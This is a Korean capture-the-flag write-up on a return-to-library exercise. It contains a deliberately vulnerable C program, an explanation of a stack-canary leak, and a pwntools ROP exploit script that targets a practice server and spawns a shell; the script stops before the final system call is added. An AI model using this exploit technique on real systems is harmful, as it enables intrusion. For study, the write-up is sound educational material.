# return to library
## 문제 코드
<code>
	// Name: rtl.c
	// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

	#include <stdio.h>
	#include <unistd.h>

	const char* binsh = "/bin/sh";

	int main() {
	  char buf[0x30];

	  setvbuf(stdin, 0, _IONBF, 0);
	  setvbuf(stdout, 0, _IONBF, 0);

	  // Add system function to plt's entry
	  system("echo 'system@plt");

	  // Leak canary
	  printf("[1] Leak Canary\n");
	  printf("Buf: ");
	  read(0, buf, 0x100);
	  printf("Buf: %s\n", buf);

	  // Overwrite return address
	  printf("[2] Overwrite return address\n");
	  printf("Buf: ");
	  read(0, buf, 0x100);

	  return 0;
	}
</code>

## 보호 기법
* 64bit
* canary found
* NX enabled

## 코드 분석
1. read함수로 buf~canary 거리 + 1만큼 입력을 주어 canary 앞 \x00을 제거하면 printf함수로 카나리를 출력할 수 있다.
2. read 함수로 buf에 0x30보다 훨씬 큰 0x100 크기의 입력을 받고 있기 때문에 버퍼 오버플로우 공격이 가능함.

## 스택 구조

RET - RBP - \x00+canary - dummy - buf

## 카나리 릭
buf ~ rbp의 거리는 56. \0xx 값까지 해서 총 57개를 쏟아부으면 된다.

## payload

<code>
	#!/usr/bin/env python3

	from pwn import *

	p = remote('host3.dreamhack.games', 12126)
	e = ELF('./rtl')

	def slog(name, addr):
	    return success(': '.join([name, hex(addr)]))

	#[1] Leak Canary
	buf = b'A' * 0x39
	p.sendafter(b'Buf: ', buf)
	p.recvuntil(buf)

	cnry = u64(b'\x00' + p.recvn(7))

	slog('canary', cnry)

	#[2] Exploit
	system_plt = e.plt['system']
	binsh = 0x400874
	pop_rdi = 0x0000000000400853
	ret = 0x0000000000400285

	payload = b'A' * 0x38 + p64(cnry) + b'B'*0x8
	payload += p64(ret) # align stack to prevent errors caused by movaps
	payload += p64(pop_rdi)
	payload += p64(binsh)

	</code>

------------------------------------------------










